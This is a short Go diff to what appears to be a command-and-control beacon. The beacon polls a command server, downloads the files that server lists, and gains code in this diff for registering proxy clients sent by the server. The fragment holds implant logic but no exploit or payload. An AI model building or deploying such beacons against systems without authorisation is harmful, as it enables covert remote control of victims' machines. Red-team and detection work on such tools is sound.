@@ -26,6 +26,7 @@ func (packet BeaconHttp) queryServer() {
 		
 		controlDataBytes, err := io.ReadAll(resp.Body)
 		debugFatal(err)
+
 		var commResp CommandResponse
 		json.Unmarshal(controlDataBytes, &commResp)
 		
@@ -33,6 +34,10 @@ func (packet BeaconHttp) queryServer() {
 	} else if debug {
 		fmt.Println("Couldn't reach command.")
 	}
+}
+
+func (packet BeaconHttp) addProxyClient(client Beacon) {
+	packet.proxyClients = append(packet.proxyClients, client)
 }
 
 func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
@@ -63,6 +68,13 @@ func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 
 	for _, file := range commResp.Upload {
 		packet.download(file)
+	}
+
+	for _, client := range commResp.ProxyClients {
+		var beacon Beacon
+		json.Unmarshal([]byte(client), &beacon)
+		fmt.Println("Adding proxy " + beacon.Id)
+		packet.addProxyClient(beacon)
 	}
 }
 
